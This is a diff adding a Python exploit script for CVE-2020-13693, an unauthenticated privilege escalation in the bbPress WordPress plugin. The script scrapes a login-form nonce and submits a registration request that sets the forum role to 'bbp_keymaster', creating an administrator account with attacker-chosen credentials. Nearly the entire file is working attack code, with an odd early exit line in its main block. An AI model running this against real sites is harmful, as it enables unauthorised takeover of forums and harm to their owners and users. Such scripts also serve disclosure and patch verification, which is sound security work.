@@ -1,0 +1,58 @@
+# Exploit Title: Wordpress Plugin BBPress 2.5 - Unauthenticated Privilege Escalation
+# Date: 2020-05-29
+# Exploit Author: Raphael Karger
+# Software Link: https://codex.bbpress.org/releases/
+# Version: BBPress < 2.5
+# CVE: CVE-2020-13693
+
+import argparse
+import requests
+import bs4
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+ 
+useragent = {"User-Agent" : "This is a real browser i swear"}
+
+def grab_nonce_login_page(url):
+    try:
+        login_page_request = requests.get(url, verify=False, timeout=10, headers=useragent)
+        soup = bs4.BeautifulSoup(login_page_request.text, "lxml")
+        action = soup.find("form", class_="bbp-login-form")
+        wp_login_page = action.get("action")
+        wp_nonce = action.find("input", id="_wpnonce").get("value")
+        return (wp_nonce, wp_login_page)
+    except Exception as nonce_error:
+        print("[-] Nonce Error: '{}'".format(nonce_error))
+    return False
+
+def exploit(url, username, password, email):
+    info = grab_nonce_login_page(url)
+    if info:
+        nonce = info[0]
+        login_page = info[1]
+        try:
+            return requests.post(login_page, data={
+                "user_login" : username,
+                "user_pass" : password,
+                "user_email" : email,
+                "user-submit" : "",
+                "user-cookie" : "1",
+                "_wpnonce" : nonce,
+                "bbp-forums-role" : "bbp_keymaster"
+            }, allow_redirects=False, verify=False, timeout=10, headers=useragent)
+        except Exception as e:
+            print("[-] Error Making Signup Post Request: '{}'".format(e))
+    return False
+
+if __name__ == "__main__":
+    exit("asdasd")
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-n", "--username", dest="username", help="Username of Newly Created Keymaster", default="raphaelrocks")
+    parser.add_argument("-p", "--password", dest="password", help="Password of Newly Created Keymaster", default="raphael123")
+    parser.add_argument("-e", "--email", dest="email", help="Email of Newly Created Keymaster", default="test@example.com")
+    parser.add_argument("-u", "--url", dest="url", help="URL of Page With Exposed Register Page.", required=True)
+    args = parser.parse_args()
+    site_exploit = exploit(args.url, args.username, args.password, args.email)
+    if site_exploit and site_exploit.status_code == 302:
+        exit("[+] Exploit Successful, Use Username: '{}' and Password: '{}'".format(args.username, args.password))
+    print("[-] Exploit Failed")
